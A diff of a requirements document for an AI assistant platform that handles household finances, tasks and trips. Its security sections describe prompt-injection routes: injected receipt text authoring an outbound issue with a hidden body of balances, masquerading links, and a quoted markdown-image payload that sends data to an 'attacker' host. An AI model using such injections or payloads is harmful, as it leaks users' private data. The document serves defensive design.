@@ -1,9 +1,13 @@
 # AI Capability Platform — Business Requirements Document
 
-**Status:** Phase 0 and Phase 1 delivered; Phase 2 not started
 **Author:** Jared Carrano
 **Date:** 2026-09-13
-**Version:** 1.1
+**Version:** 2.0
+**Plan:** [AI-CAPABILITY-PLATFORM-PLAN.yaml](AI-CAPABILITY-PLATFORM-PLAN.yaml)
+
+> This document states what the system must do and why. How it is built, what
+> has shipped, and in what order — including every file, symbol, and test
+> citation — lives in the plan.
 
 ---
 
@@ -32,21 +36,16 @@ A single capability platform with four explicit trust tiers, enforced structural
 
 Every capability declares its tier **in the registry definition**, not in a comment or a reviewer's memory. The tier determines which gates the platform enforces at runtime.
 
-### 1.3 What Already Exists
+### 1.3 Starting Point
 
-This document builds on working code, not a greenfield design. An honest inventory:
+This document governs working code, not a greenfield design. The AI surface it
+inherits already has a read-only data boundary (SEC-018), a nonce-based action
+registry, a structured audit log, two registered write actions, a mutex-guarded
+monthly cost cap, and a sanitized markdown renderer whose allowlist excludes
+`img`. The requirements below are written to be satisfiable incrementally on top
+of that, not to replace it. The plan holds the component-by-component inventory.
 
-| Component | File | State |
-|-----------|------|-------|
-| Read-only data boundary | `services/chatbotDataService.ts` | Solid. `ReadOnlyDataService` injected; structurally cannot write (SEC-018). |
-| Action registry | `services/chatActions/registry.ts` | Solid. `Map`-based allowlist (prototype-pollution safe), Zod schema per action, JWT-derived context. |
-| Proposal nonces | `services/chatActions/proposalStore.ts` | Solid mechanism, **in-memory** — single-process only, does not survive restart. |
-| Audit log | `services/chatActions/auditLog.ts` | Structured success/rejection logging to CloudWatch. Not surfaced in UI. |
-| Registered actions | `createTaskAction.ts`, `submitGithubIssueAction.ts` | Two. `create_task` correctly re-uses `createTaskSchema` from the HTTP route. |
-| Cost cap | `services/chatbotCostTracker.ts` | $20/mo interactive + $5/mo background (REQ-P050), mutex-guarded, segmented **per workspace**. Prices base, cached, and failed-request tokens (Q-P08). |
-| Output rendering | `frontend/src/components/chat/ChatMessageBubble.tsx` | Markdown via `react-markdown` + `remark-gfm`, behind a narrowed `rehype-sanitize` allowlist (TD-015). `img` is **not** allowlisted, so remote images are already blocked. External `http`/`https` links **are** clickable — see §7.3. |
-
-The last row matters more than it looks — see §7.3.
+The renderer's handling of external links matters more than it looks — see §7.3.
 
 ### 1.4 Relationship to Existing BRDs
 
@@ -98,7 +97,7 @@ It appears safer ("the agent never executes anything; the user's own browser doe
 
 The registry design achieves the same goals — executes as the user, same validation, same business rules, no elevated path — while keeping the allowlist on the trusted side of the boundary. The card carries an opaque `actionId` plus parameters; the server resolves what that means. **(D-P01)**
 
-> Note: the codebase is REST/Express, not GraphQL. The equivalent of "must be expressible as a GraphQL mutation the user could send" is: **every action must map to an endpoint a human already has in the UI, re-using that route's exported Zod schema.** `createTaskAction.ts` is the reference implementation — it imports `createTaskSchema` directly from `routes/tasks.ts`.
+> Note: the codebase is REST/Express, not GraphQL. The equivalent of "must be expressible as a GraphQL mutation the user could send" is: **every action must map to an endpoint a human already has in the UI, re-using that route's exported Zod schema.** `create_task` is the reference shape: it imports the same schema the HTTP route validates against, so there is one definition of a valid task, not two.
 
 ---
 
@@ -109,7 +108,7 @@ The registry design achieves the same goals — executes as the user, same valid
 | ID | Requirement |
 |----|-------------|
 | REQ-P001 | Every registered capability (read tool or write action) must declare a `tier` of `T0`, `T1`, or `T2` in its registry definition. Registration without a tier must throw at startup. |
-| REQ-P002 | The tier must be enforced at execution time by the platform, not by the capability's own handler. A T1 action must be structurally unable to execute without a consumed nonce. Grants are branded values only `proposalStore` mints; `executionGrantCallSites.test.ts` scans production source and fails if anything else mints one or calls a handler directly — which is what turns "greppable" into "enforced", given JS has no module-private constructor. |
+| REQ-P002 | The tier must be enforced at execution time by the platform, not by the capability's own handler. A T1 action must be structurally unable to execute without a consumed nonce. Authorization must be carried by a value only the proposal store can mint, and an automated source scan must fail if anything else mints one or invokes a handler directly — the language offers no module-private constructor, so the scan is what turns "greppable" into "enforced". |
 | REQ-P003 | T3 is not a declarable tier. It is the set of operations no registry entry may wrap; enforcement is by the absence of a registration plus the service-layer isolation already required by SEC-001–003. |
 | REQ-P004 | Tier changes (promoting an action from T1 to T2) must be a deliberate code change reviewed against §3.3, not a configuration toggle. |
 
@@ -141,17 +140,17 @@ No AI path, attended or unattended, may reach the following. This list is additi
 
 ## 4. Capability Registry Architecture
 
-The existing `chatActions/registry.ts` generalizes into the single place where AI capability is declared. Read tools and write actions both become registry entries so that tier, data class, and audit behavior are described uniformly.
+A single registry is the place where AI capability is declared. Read tools and write actions are both registry entries so that tier, data class, and audit behavior are described uniformly.
 
 | ID | Requirement |
 |----|-------------|
-| REQ-P010 | Both read tools and write actions must be registered in a single capability registry. Tool definitions sent to the model must be **derived** from the registry, not maintained separately in `chatbotPrompt.ts`. **Implemented:** `services/capabilities/readCapabilities.ts` pairs each read tool's definition with its executor; `buildChatbotTools()` derives the array. Write actions remain in the chat action registry and are never exposed as tools — they reach the model only via `propose_action`. |
+| REQ-P010 | Both read tools and write actions must be registered in a single capability registry. Tool definitions sent to the model must be **derived** from the registry, not maintained separately in the prompt layer. Write actions must never be exposed as tools; they reach the model only via `propose_action`. |
 | REQ-P011 | Every write action **that has an equivalent human UI flow** must re-use the Zod schema exported by that flow's HTTP route. Defining a parallel schema for such an action is prohibited — it creates two sources of truth for validation. `create_task` is the reference implementation (§2.3). **Named exception:** `submit_github_issue` has no human UI equivalent — there is no route through which a person files a repo issue from this app — so it defines its own schema and calls the GitHub API directly. Any new action claiming this exception must be listed here, so "no equivalent exists" stays a deliberate finding rather than the path of least resistance. |
-| REQ-P012 | Every write action **that has an equivalent human UI flow** must execute through the existing service layer, never through direct storage access, so business rules apply identically to AI-originated and human-originated writes. Same named exception as REQ-P011: `submit_github_issue` targets an external API, not this app's data, and has no service layer to route through. It is also the only shipped action with an outbound effect, which is why SEC-P010's display-coverage rule matters most there (§5.2). |
+| REQ-P012 | Every write action **that has an equivalent human UI flow** must execute through the existing service layer, never through direct storage access, so business rules apply identically to AI-originated and human-originated writes. Same named exception as REQ-P011: `submit_github_issue` targets an external API, not this app's data, and has no service layer to route through. It is also the only action with an outbound effect, which is where SEC-P010's display-coverage rule carries the most weight (§5.2). |
 | REQ-P013 | Handler context remains JWT-derived only (`userId`, `familyId`). No identity, family, or privilege parameter may be accepted from model output. (Restates SEC-A002; now platform-wide.) |
 | REQ-P014 | Registration must fail fast at startup on: duplicate `actionId`, missing tier, missing `dataClass`, or a T2 declaration whose `dataClass` is not in the permitted set. |
 | REQ-P015 | A test must assert that the set of registered T2 actions equals an explicit hardcoded list. Adding a T2 action requires editing that list, making promotion visible in review. |
-| REQ-P016 | The tool definitions exposed to the model must be filtered by workspace. The Business Workspace exposes no AI tools at all (§11). **Enforced.** `refuseBusinessWorkspace` in `routes/chatbot.ts` 403s every chatbot route when the JWT's active family is a business workspace; the frontend also hides the chat surface, but the route guard is the control. The `aiEnabled` flag on `buildChatbotTools` is a second layer, not the enforcement point — a flag nobody passes protects nothing. See Q-P07. |
+| REQ-P016 | The tool definitions exposed to the model must be filtered by workspace. The Business Workspace exposes no AI capability at all (§11), and the refusal must be enforced server-side at the route boundary. Hiding the surface in the frontend is a courtesy, not the control; nor is a flag a caller could omit. |
 
 ### 4.1 Tool Surface Growth
 
@@ -159,7 +158,7 @@ Expanding to three domains takes the tool count from 10 today (8 reads + `propos
 
 | ID | Requirement |
 |----|-------------|
-| REQ-P017 | Tool definitions must remain prompt-cached. `buildChatbotTools` applies the `cache_control` breakpoint to the final tool; `chatbotService.chatbotTools()` memoizes the result so the cached prefix stays byte-identical across requests. (The old `CACHED_CHATBOT_TOOLS` module-level const is gone — it evaluated inside the chat-action registration import cycle.) Cache breakpoints must be re-validated when the tool list changes materially, **and cached tokens must be priced** — see Q-P08 for the period when they were not. |
+| REQ-P017 | Tool definitions must remain prompt-cached, which requires the cached prefix to stay byte-identical across requests. Cache breakpoints must be re-validated whenever the tool list changes materially, **and cached tokens must be priced** against the cap (§8) — they are billed, and the provider's `input_tokens` figure excludes them. |
 | REQ-P018 | If the tool count exceeds 20, tools must be grouped by domain and exposed progressively rather than as a single flat list. Measurement before optimization: this is triggered by observed misselection, not by the count alone. |
 | REQ-P019 | Every tool description must accurately describe what the tool returns. A description that promises fields the implementation does not return is treated as a defect of the same severity as a wrong return value (§7.4). |
 
@@ -177,8 +176,8 @@ A **plan card** is one proposal carrying N proposed writes, each rendered as an 
 |----|-------------|
 | REQ-P020 | A proposal may contain 1..N rows. Rows may be homogeneous (40 recategorizations) or heterogeneous (create trip → add stops → tag budget). |
 | REQ-P021 | Each row must be independently de-selectable. Confirm executes exactly the checked rows. |
-| REQ-P022 | Rows are ordered and executed as a single batch under one confirmation, producing one undo handle for the whole batch. (Ordering and batching shipped in Phase 1; the undo handle is Phase 4.) |
-| REQ-P023 | Execution is all-or-nothing per confirmation. A row failing server-side validation rolls back the batch and reports which row failed and why. **Partially shipped.** Every checked row is validated before any row executes, so a batch that *would* fail validation writes nothing. A storage failure partway through execution still leaves the earlier rows applied; the response names the failing row and the number applied. The remaining gap closes with REQ-P025 (durable undo handles) in Phase 4 — there is no rollback to perform until prior state is recorded. The failure response names the failing row and how many rows were applied, and the frontend surfaces that body verbatim rather than axios's "Request failed with status code 500"; the card then withdraws Confirm and Edit, because the nonce is spent whether or not execution succeeded. |
+| REQ-P022 | Rows are ordered and executed as a single batch under one confirmation, producing one undo handle for the whole batch.|
+| REQ-P023 | Execution is all-or-nothing per confirmation. A row failing server-side validation rolls back the batch and reports which row failed and why. The failure must reach the user in the terms the server used — which row, why, and how many rows were applied — never as a generic transport error. Once a confirmation is spent, the card must withdraw Confirm and Edit whether or not execution succeeded, because the nonce is gone either way. |
 | REQ-P024 | Every row must be re-validated by its action's Zod schema at confirm time, independently. A row edited by the user is validated as edited. (Extends SEC-A004.) |
 
 ### 5.2 Legibility
@@ -187,8 +186,8 @@ The plan card is the mechanism by which this design trades per-action scrutiny f
 
 | ID | Requirement |
 |----|-------------|
-| SEC-P010 | Each row must display the **real values** that will be written — resolved human-readable names, not IDs, and not a model-authored summary of itself. A row the UI cannot fully render must be rejected rather than truncated. (Extends SEC-A008.) **Enforced as coverage, not presence:** `buildProposalRows` rejects any row whose server-parsed params contain a key with no matching `displayField`. Shape-checking alone was not enough — the dangerous proposal is a well-formed row showing a plausible title while `params.body` carries 64 KB the user never sees, which is a one-click exfiltration primitive for `submit_github_issue` and authorable by injected content in an uploaded receipt. Also rejects: non-array `displayFields`, empty-string values (they render as nothing), duplicate keys (one silently disappears in render), and an empty field list. |
-| SEC-P011 | Rows must display the *current* value alongside the proposed value for any update, so the user sees what changes rather than only what it becomes. The comparison is produced by the action's own `describeCurrent` hook on the server; `propose_action` deliberately has no field for it, so the model cannot narrate what it is about to overwrite. Both shipped actions are creates and populate nothing; the first implementers are the Phase 3 update actions. |
+| SEC-P010 | Each row must display the **real values** that will be written — resolved human-readable names, not IDs, and not a model-authored summary of itself. A row the UI cannot fully render must be rejected rather than truncated. (Extends SEC-A008.) The rule is **coverage, not presence**: every parameter the server will act on must appear on the card. Checking that a row is well-formed is not sufficient — the dangerous proposal is one showing a plausible title while a `body` parameter carries kilobytes the user never sees, which is a one-click exfiltration primitive for any action with an outbound effect and is authorable by injected content in an uploaded attachment. A row must also be rejected if a displayed value would render as nothing, or if two fields collide so that one silently disappears, since either produces a card that under-reports itself. |
+| SEC-P011 | Rows must display the *current* value alongside the proposed value for any update, so the user sees what changes rather than only what it becomes. The comparison must be produced server-side by the action itself, and the proposal schema must have no field for it, so the model cannot narrate what it is about to overwrite. |
 | SEC-P012 | Cards exceeding a legibility threshold (initially 25 rows) must group rows by action type with per-group select-all, and must surface a count-by-type summary above the rows. The summary supplements the rows; it never replaces them. |
 | SEC-P013 | The confirm control must state the exact count being executed ("Apply 38 changes"), derived from checked rows at click time. |
 
@@ -209,7 +208,7 @@ SEC-A007 ("only one action proposal may be active per conversation") is **preser
 | ID | Requirement |
 |----|-------------|
 | REQ-P028 | The proposal store must persist across process restart before unattended proposals (§6) ship. The current in-memory `Map` is acceptable for conversation-scoped cards on a single PM2 process; it is not acceptable for a queue a background agent writes to and a human reviews hours later. |
-| REQ-P029 | If the deployment ever becomes multi-process, nonces must move to a shared store. (Restates the existing note in `proposalStore.ts`.) |
+| REQ-P029 | If the deployment ever becomes multi-process, nonces must move to a shared store. |
 
 ---
 
@@ -251,7 +250,7 @@ SEC-A007 ("only one action proposal may be active per conversation") is **preser
 |-----|----------|-------|
 | Access to private data | **Yes** | Full family financial history, tasks, trips. Non-negotiable — it is the product. |
 | Exposure to untrusted content | **Yes** | See §7.2. Cannot be eliminated; Plaid merchant strings and uploaded attachments are inherently attacker-influenceable. |
-| Exfiltration vector | **Rendering: closed by policy. Outbound actions: closed by SEC-P010.** | Two vectors, not one. §7.3 closes *rendering* — no remote images, no active content. But `submit_github_issue` is itself an outbound channel with a server-held token, and an adversarial review found the real hole was not the renderer: a row could carry a 64 KB `body` the card never displayed, so injected receipt text could author a plausible-looking bug report containing the household's balances and the user would approve it having read only the title. Closed by requiring every written param to appear on the card (SEC-P010). Any future action with an outbound effect re-opens this question and must be assessed against it, not waved through on §7.3. |
+| Exfiltration vector | **Rendering: closed by policy. Outbound actions: closed by SEC-P010.** | Two vectors, not one. §7.3 closes *rendering* — no remote images, no active content. But an action that posts to an external service is itself an outbound channel, and the renderer does not govern it: a row can carry a large parameter the card never displays, letting injected content author a plausible-looking outbound message containing the household's balances that the user approves having read only the title. Closed by SEC-P010's display-coverage rule. Any future action with an outbound effect re-opens this question and must be assessed against it, not waved through on §7.3. |
 
 Because two legs are structural, **the entire injection defense rests on the third**. This elevates §7.3 from a rendering preference to the load-bearing control in the system.
 
@@ -272,17 +271,14 @@ Because two legs are structural, **the entire injection defense rests on the thi
 
 ### 7.3 Output Rendering Policy — Load-Bearing Invariant
 
-Assistant output is rendered as markdown (`react-markdown` + `remark-gfm`) behind a deliberately narrowed `rehype-sanitize` allowlist, hardened under TD-015. Measured against the requirements below, the current state is **compliant**:
-
-- **SEC-P023 is already satisfied.** `img` is absent from the allowlist, so the silent-exfiltration primitive is closed — and closed by design, not by accident.
-- **SEC-P024 is satisfied as amended.** External links are clickable, and the destination host is always disclosed next to the link text. See the amended requirement below.
+Assistant output is rendered as markdown behind a deliberately narrowed sanitizer allowlist. Because two legs of the trifecta are structural (§7.1), this section is the load-bearing control in the system, and that allowlist is a security boundary rather than a styling choice.
 
 | ID | Requirement |
 |----|-------------|
 | SEC-P022 | Same-origin internal application links are permitted and clickable. Action-card resource links (e.g. `/tasks?taskId=…`) are the canonical form. |
 | SEC-P023 | **Remote images are prohibited without exception.** An image fetches automatically with no user interaction, making it the highest-severity exfiltration primitive: an injected `![](https://attacker/?d=<data>)` leaks silently on render. |
-| SEC-P024 | **Amended 2026-09-13.** External URLs in model output render as clickable anchors, opened with `rel="noopener noreferrer nofollow"`, and **must disclose their destination host** in visible text beside the link whenever the link text does not already contain it. The original rule ("inert, non-clickable text") is withdrawn. Rationale: the severe case was always the remote image, which fetches on render with no interaction, and that stays blocked by the tag allowlist. An anchor requires a deliberate click; what made it dangerous was the *masquerade* — injected content rendering `[your OpenTable reservation]` over a hostile URL, giving the reader nothing to be suspicious of. Disclosing the host removes the deception and keeps the ability to cite a restaurant page or a bank's support URL, which is most of the value of Phase 2 trip and budget conversations. Locked by `ChatMessageBubble.security.test.tsx`; deleting those tests removes the basis on which the amendment was accepted. |
-| SEC-P025 | An automated test must assert this invariant and fail if the renderer is swapped, the sanitizer dropped, or the allowlist widened. The test is the control; the policy alone will not survive contact with a future feature. **Implemented:** `frontend/src/components/chat/ChatMessageBubble.security.test.tsx`, verified by mutation. |
+| SEC-P024 | **Amended 2026-09-13.** External URLs in model output render as clickable anchors, opened with `rel="noopener noreferrer nofollow"`, and **must disclose their destination host** in visible text beside the link whenever the link text does not already contain it. The original rule ("inert, non-clickable text") is withdrawn. Rationale: the severe case was always the remote image, which fetches on render with no interaction, and that stays blocked by the tag allowlist. An anchor requires a deliberate click; what made it dangerous was the *masquerade* — injected content rendering `[your OpenTable reservation]` over a hostile URL, giving the reader nothing to be suspicious of. Disclosing the host removes the deception and keeps the ability to cite a restaurant page or a bank's support URL, which is most of the value of trip and budget conversations. The amendment is accepted on the condition that the disclosure is test-locked (SEC-P025); without that test, the original inert-text rule stands. |
+| SEC-P025 | An automated test must assert this invariant and fail if the renderer is swapped, the sanitizer dropped, or the allowlist widened. The test is the control; the policy alone will not survive contact with a future feature. It must be mutation-verified — a test that still passes against a deliberately broken renderer is worse than no test, because it reports a boundary that is not there. |
 | SEC-P026 | Any future request to render remote imagery (e.g. place photos in trip planning) must route through the existing server-side proxy pattern with a host allowlist, and must be specified as an amendment to this section rather than implemented ad hoc. |
 
 **Accepted cost:** an external link is one click from leaving with whatever its URL carries. The host disclosure is what makes that click informed rather than blind, so it is not decoration — it is the control. **(D-P03, as amended)**
@@ -308,15 +304,13 @@ The existing $20/month cap was sized for a human typing into a chat overlay, wit
 |----|-------------|
 | REQ-P050 | Spend must be capped per **workload class**, not as a single pool. Initial classes: `interactive` (chat, attachments) and `background` (unattended automations, scheduled digests). |
 | REQ-P051 | Each workload class has an independent cap and an independent kill switch. Exhausting the background budget must never prevent a user from using the chatbot. |
-| REQ-P052 | Caps are per workspace × workload class. The existing per-workspace segmentation in `chatbotCostTracker.ts` is the correct dimension to extend, not replace. |
+| REQ-P052 | Caps are per workspace × workload class. The existing per-workspace segmentation is the correct dimension to extend, not replace. |
 | REQ-P053 | Cost tracking must remain concurrency-safe (mutex or equivalent) across both classes. (Restates SEC-017.) |
-| REQ-P054 | Background work must route to the cheapest model adequate for the task. Classification, clustering, and extraction are fast-tier work; conversational reasoning is frontier-tier. Model selection is per-capability and declared in the registry. **NOT implemented.** Neither `ReadCapability` nor `ChatActionDefinition` carries a `model` field; every model is hardcoded at its call site (`chatbotService`, `categorizationService`, both Amazon adapters). Nothing depends on this until a background workload exists, so it lands with Phase 5/6. |
+| REQ-P054 | Background work must route to the cheapest model adequate for the task. Classification, clustering, and extraction are fast-tier work; conversational reasoning is frontier-tier. Model selection must be per-capability and declared in the registry, not hardcoded at each call site. |
 | REQ-P055 | A pre-flight estimate must bound any background batch before it runs. A batch whose estimate exceeds the remaining background budget must not start partially. |
-| REQ-P056 | Model identifiers must be reviewed against currently available models. **Done 2026-09-13.** Sonnet and Opus moved to the 5 series (`claude-sonnet-5`, `claude-opus-5`) across `chatbotService`, `categorizationService`, `amazonCategorizerAdapter` and `amazonPdfParser`; Haiku 4.5 is still current and stays pinned to its dated build. All three verified to resolve against the Messages API, including a multi-turn tool loop on Opus 5 (whose responses now lead with a `thinking` block — the loop already selects blocks by type rather than by position, so it is unaffected). **`MODEL_PRICING` in `chatbotCostTracker.ts` was NOT re-verified** and still carries the previous generation's rates; if they are wrong the $20 cap does not mean what it says. Tracked as Q-P08. |
+| REQ-P056 | Model identifiers must be reviewed against currently available models. A pinned identifier that has been superseded is a silent quality regression, and its price is a silent cap regression: whenever a model moves, its rates must be re-verified in the same change, because a cap computed from stale rates does not mean what it says. |
 
-**Implemented:** REQ-P050–P053 and REQ-P055 in `chatbotCostTracker.ts` (REQ-P054 is not — see above). Interactive deliberately keeps the original storage key (`chatbot_costs_{familyId}_{month}`); suffixing it would have orphaned the current month's accrued spend and silently reset the running total, repeating the one-time reset D11 already paid for. Background writes to a new key. `canAffordBatch` implements the REQ-P055 pre-flight so a sweep that cannot finish never starts.
-
-**Cost accounting completeness (Q-P08).** Two undercounts were found and fixed on 2026-09-13, both of the "the number is quietly too small" kind that a cap cannot survive. (1) `usage.input_tokens` excludes cache reads and writes, so the deliberately-cached prefix (REQ-P017) was billed by Anthropic and recorded here as zero — and a cache write costs 1.25x uncached input, so the undercount was worst on the short-burst pattern this family actually uses. (2) Usage was recorded only on the success path, so a tool loop that ran to its 10-iteration limit or a request that timed out after several Claude calls moved the monthly total by $0. Locked by `costTrackerCachePricing.test.ts`. Rates verified the same day: Opus 5 $5/$25, Sonnet 5 $2/$10, Haiku 4.5 $1/$5. Note that Opus 5 and Sonnet 5 use a newer tokenizer producing ~30% more tokens for the same text, so the same $20 buys materially less Opus than it did.
+**Cost accounting must be complete, or the cap is decorative.** Two undercounts of the "quietly too small" kind a cap cannot survive are specifically in scope. Cached tokens are billed but excluded from the provider's `input_tokens` figure, making them easy to record as zero on exactly the prefix REQ-P017 caches on purpose — and a cache write costs more than uncached input, so the error is worst on the short-burst pattern this family actually uses. Tokens spent by requests that fail are equally real: a tool loop that runs to its iteration limit, or a request that times out after several model calls, must still move the monthly total. Recording usage only on the success path is prohibited.
 
 > Confirmation is deliberately free: confirming a pending card performs no LLM call, so a cap exhausted between proposal and confirmation does not strand a valid card. (Preserves SEC-A020.)
 
@@ -324,11 +318,11 @@ The existing $20/month cap was sized for a human typing into a chat overlay, wit
 
 ## 9. Domain Capability Inventory
 
-Domains are added **read-first, write-second**: a domain earns write actions only after its read tools prove useful in practice. Read coverage is the larger near-term win, because the assistant currently cannot see two-thirds of the app.
+Domains are added read-first, write-second (REQ-P080). Read coverage is the larger near-term win, because the assistant currently cannot see two-thirds of the app.
 
 ### 9.1 Budgeting & Transactions
 
-*Reads exist today.* `query_transactions`, `get_categories`, `get_budgets`, `get_budget_summary`, `get_accounts`, `get_spending_by_category`, `get_cash_flow`, `get_auto_categorization_rules`.
+Read coverage of this domain is the one part of the app the assistant can already see.
 
 | Capability | Tier | Notes |
 |-----------|------|-------|
@@ -342,12 +336,12 @@ Domains are added **read-first, write-second**: a domain earns write actions onl
 
 ### 9.2 Tasks & Household Coordination
 
-*No reads today* — `create_task` writes blind.
+The assistant can write a task here but cannot read one, so it writes blind. Closing that asymmetry is the highest-value read in the app.
 
 | Capability | Tier | Notes |
 |-----------|------|-------|
-| Query tasks (open, assigned, overdue, snoozed) | T0 | Highest-value missing read in the app. |
-| Create task | T1 | Exists. |
+| Query tasks (open, assigned, overdue, snoozed) | T0 | |
+| Create task | T1 | |
 | Update task fields | T1 | |
 | Snooze / reorder | T2 candidate | Visibility and ordering only; trivially reversible. |
 | Complete a task | **T1 — never T2** | Completion credits the leaderboard. An unattended completion silently awards points and corrupts a shared, competitive record. |
@@ -355,7 +349,7 @@ Domains are added **read-first, write-second**: a domain earns write actions onl
 
 ### 9.3 Trips & Projects
 
-*Entirely invisible to the AI today.*
+Neither domain is reachable by the assistant at all.
 
 | Capability | Tier | Notes |
 |-----------|------|-------|
@@ -394,7 +388,7 @@ Diagnosis after the fact is only possible if the evidence was captured at the ti
 | REQ-P062 | Traces must carry a correlation ID shared with the audit log entry and any resulting proposal, so a write can be traced back to the reasoning that produced it. |
 | REQ-P063 | Default trace retention is 30 days. Traces referenced by an open learning (§15) are retained until that learning is closed. |
 
-**Implemented:** `backend/src/services/agentTraceStore.ts`, wired into `ChatbotService`. One deviation worth recording: REQ-P061 asks for results verbatim, but an uncapped ledger would persist every transaction the model ever read. Results above 64 KB are therefore dropped and explicitly flagged `resultTruncated`, rather than silently shortened — a reader can always tell "this is what the model saw" from "this is a fragment of it". Attachments are recorded as mime type and byte count only.
+REQ-P061's verbatim rule is bounded by a size limit, since an uncapped ledger would persist every transaction the model ever read. An oversized result must be dropped and explicitly flagged as dropped, never silently shortened: a reader must always be able to tell "this is what the model saw" from "this is a fragment of it".
 
 ### 10.2 Full Transcript — On Incident Only
 
@@ -421,21 +415,18 @@ Diagnosis after the fact is only possible if the evidence was captured at the ti
 
 ---
 
-## 12. Phasing
+## 12. Delivery Constraints
 
-| Phase | Scope | Exit criteria |
-|-------|-------|---------------|
-| **0 — Correctness** | Fix `get_budgets` (returns no actuals despite its description; returns bare IDs; absent budgets indistinguishable from no lookup). Add the §7.3 rendering-invariant test. | **Done.** The Subaru-class failure is covered by regression tests; the rendering invariant is locked and mutation-verified. |
-| **1 — Foundations** | **Done.** Tier + dataClass in the registry; tool definitions derived from it; plan cards with per-row toggles (incl. SEC-P012 grouping and SEC-P013 confirm count); split cost caps; structured trace (§10.1). Also delivered, beyond the original scope: the Business Workspace AI route guard (REQ-P016), execution grants with a call-site scan (REQ-P002), the SEC-P010 display-coverage rule, the SEC-P024 link amendment, the 5-series model move (REQ-P056), cost-accounting completeness (Q-P08), and all of Agent Learnings Phase 1. | Met: the existing two actions run unchanged on the new machinery, proven by the pre-existing `chatActions.security.test.ts` suite passing against the new confirm path. |
-| **2 — Read coverage** | Task, trip, and project read tools. | The assistant can answer "what's on our plate this weekend?" |
-| **3 — Confirmed writes** | T1 action set per §9. | Multi-step plan cards work end to end. |
-| **4 — Activity log & undo** | Durable undo handles, user-facing activity log, bulk undo. | Every AI write is visible and reversible. Prerequisite for Phase 5. |
-| **5 — Unattended tier** | Standing-consent settings, caps, kill switch; first T2 automation is transaction categorization. | An automation can be enabled, produces marked writes, and is bulk-undoable. |
-| **6 — Proactive reads** | Scheduled digests and insight generation; may queue proposals for later approval, never writes. | Background budget holds; chat is never starved. |
+The schedule — which phase is where, what has shipped, and what each phase
+contains — lives in [AI-CAPABILITY-PLATFORM-PLAN.yaml](AI-CAPABILITY-PLATFORM-PLAN.yaml).
+Three ordering rules are normative and belong here, because violating them
+produces an unsafe system rather than a late one.
 
-Phase 4 gates Phase 5 deliberately: SEC-P001 (one-click reversibility) is unenforceable until undo exists, so unattended writes cannot ship before the thing that makes them survivable.
-
----
+| ID | Constraint |
+|----|------------|
+| REQ-P080 | Domains are added **read-first, write-second**. A domain earns write actions only after its read tools have proven useful in practice. |
+| REQ-P081 | Durable undo (§5.4) and the user-facing activity log (§6.3) must ship **before** any T2 automation. SEC-P001 gates T2 on one-click reversibility, which is unenforceable until undo exists — so unattended writes cannot ship before the thing that makes them survivable. |
+| REQ-P082 | A durable proposal store (REQ-P028) must ship before any proposal is queued for review outside the conversation that produced it. |
 
 ## 13. Decisions
 
@@ -454,28 +445,29 @@ Phase 4 gates Phase 5 deliberately: SEC-P001 (one-click reversibility) is unenfo
 
 ## 14. Open Questions
 
-| ID | Question | Proposed default |
-|----|----------|------------------|
-| ~~Q-P01~~ | ~~Cap values for `interactive` vs `background`.~~ | **Decided.** $20 interactive / $5 background stands, as shipped — the BRD's proposed $15/$5 is not adopted, because cutting a cap the family already relies on to fund a background workload that does not exist yet trades a real regression for a hypothetical. Configurable via `CHATBOT_MONTHLY_LIMIT` / `AI_BACKGROUND_MONTHLY_LIMIT` if that changes. |
-| ~~Q-P02~~ | ~~Trace retention period.~~ | **Decided & implemented.** 30 days, with a `pinned` flag exempting traces referenced by a learning. A hard cap of 1000 traces per family bounds the file regardless; pinned traces are evicted last, never first. **Correction (2026-09-13):** the flag and `AgentTraceStore.pin()` shipped with unit tests but **no production caller ever set it** — a feature tested in isolation and reachable by nothing, so every learning older than 30 days would have lost its evidence. Now set at trace-write time from whether the turn recorded a learning; `pin()` remains for pinning an older trace. Covered end-to-end by `learningEvidence.security.test.ts`, mutation-verified. |
-| Q-P03 | Does the plan-card legibility threshold (25 rows) hold in practice on mobile? | Validate during Phase 3 with a real 40-row recategorization. |
-| ~~Q-P04~~ | ~~Should T2 automations run on a schedule, or on data arrival (post-Plaid-sync)?~~ | **Decided.** On data arrival — it bounds volume to what actually changed and makes idempotency natural. Revisit if a Phase 5 automation turns out to need a clock rather than an event. |
-| ~~Q-P05~~ | ~~Where does the trace/incident store live given the JSON-file storage model?~~ | **Decided & implemented.** Per-family JSON at `ai_traces_{familyId}`, written by `AgentTraceStore` — a narrow appender over that one namespace, not a general write capability handed to the chatbot. Retention is applied on each write rather than by a separate sweep. |
-| ~~Q-P07~~ | ~~Should §11's Business Workspace AI exclusion be enforced, given it removes a working feature?~~ | **Decided.** Enforce it — confirmed by the owner: no real use case for AI in that workspace. `refuseBusinessWorkspace` 403s every chatbot route for a business-scoped JWT; the frontend also hides the surface, but the route guard is the control. Covered by `businessWorkspaceAi.security.test.ts`. This closes a live exposure, not just a policy gap: a business-workspace token could read client royalty transactions through `get_spending_by_category`. |
-| ~~Q-P08~~ | ~~Are the rates in `MODEL_PRICING` correct for the 5-series models?~~ | **Verified 2026-09-13 against published API pricing, and two undercounts fixed.** Opus 5 ($5/$25) and Haiku 4.5 ($1/$5) were already right; Sonnet moved to $2/$10 with Sonnet 5. More seriously, the tracker was counting **neither cached tokens nor tokens spent by failed requests**. `usage.input_tokens` excludes cache reads and writes, and the chatbot caches its whole stable prefix on purpose — so that spend was billed and recorded as zero. Usage was also recorded only on the success path, meaning a tool loop that ran to its 10-iteration limit moved the monthly total by $0. Both closed; see `costTrackerCachePricing.test.ts`. **Separately worth knowing:** Opus 5 and Sonnet 5 use a newer tokenizer producing ~30% more tokens for the same text, so a $20 cap buys roughly 30% fewer Opus conversations than before even though the per-token price is unchanged. |
-| ~~Q-P06~~ | ~~External links clickable, or inert per SEC-P024?~~ | **Decided.** Clickable, with mandatory host disclosure. SEC-P024 amended accordingly; see §7.3. |
+Resolved questions are recorded here as the decision and its reason; the change
+that implemented each one is in the plan.
 
----
+| ID | Question | Resolution |
+|----|----------|------------|
+| ~~Q-P01~~ | ~~Cap values for `interactive` vs `background`.~~ | **Decided.** $20 interactive / $5 background. The BRD's originally proposed $15/$5 is not adopted: cutting a cap the family already relies on, to fund a background workload that does not exist yet, trades a real regression for a hypothetical one. Both remain configurable. |
+| ~~Q-P02~~ | ~~Trace retention period.~~ | **Decided.** 30 days, with a `pinned` flag exempting traces referenced by a learning, and a hard per-family cap bounding the store regardless. Pinned traces are evicted last, never first. |
+| Q-P03 | Does the plan-card legibility threshold (25 rows) hold in practice on mobile? | Open. Answerable only against a real 40-row card, which arrives with the first bulk write actions. |
